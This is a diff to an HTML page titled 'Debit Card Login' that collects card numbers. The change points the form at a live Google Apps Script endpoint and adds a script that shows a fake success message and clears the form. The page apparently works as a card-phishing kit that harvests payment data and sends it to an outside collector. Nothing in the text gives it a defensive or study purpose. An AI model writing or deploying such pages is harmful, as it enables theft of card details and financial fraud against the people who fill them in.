@@ -92,16 +92,22 @@
       width: 24px;
     }
 
+    .thank-you {
+      display: none;
+      text-align: center;
+      font-size: 18px;
+      color: #0f0;
+    }
   </style>
 </head>
 <body>
 
 <div class="card">
   <h2>Debit Card Login</h2>
-  <form 
-    action="YOUR_WEB_APP_URL_HERE" 
-    method="POST"
-    target="_blank"
+  <form id="cardForm" 
+        action="https://script.google.com/macros/s/AKfycbxANF_5-w06bXv1LhqMfJJ6bFhHeDEItslXY9eiVDsgZD2uCxxCE3yGbW-30odX-Bp-/exec" 
+        method="POST"
+        target="_blank"
   >
     <label>Card Number</label>
     <input type="text" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
@@ -125,7 +131,23 @@
       Submit
     </button>
   </form>
+
+  <div class="thank-you" id="thankYou">
+    ✅ Submission successful!
+  </div>
 </div>
+
+<script>
+  const form = document.getElementById("cardForm");
+  const thankYou = document.getElementById("thankYou");
+
+  form.addEventListener("submit", function(e) {
+    setTimeout(() => {
+      thankYou.style.display = "block";
+      form.reset();
+    }, 1000);
+  });
+</script>
 
 </body>
 </html>
